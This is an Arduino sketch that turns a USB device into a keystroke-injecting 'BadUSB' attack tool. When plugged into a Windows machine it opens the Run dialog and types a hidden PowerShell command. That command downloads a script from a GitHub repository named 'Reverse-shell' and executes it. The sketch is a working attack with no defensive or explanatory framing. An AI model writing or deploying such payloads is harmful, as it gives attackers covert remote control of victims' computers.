#include <HIDKeyboard.h>

HIDKeyboard keyboard;

void setup() {
  keyboard.begin();

  delay(200);

  keyboard.pressKey(GUI, 'R');
  delay(50);
  keyboard.releaseKey();

  delay(500);

  keyboard.println("powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Jakub-Trcka/Reverse-shell/main/ps.txt')\"");

  

}

void loop() {
  // put your main code here, to run repeatedly:

}
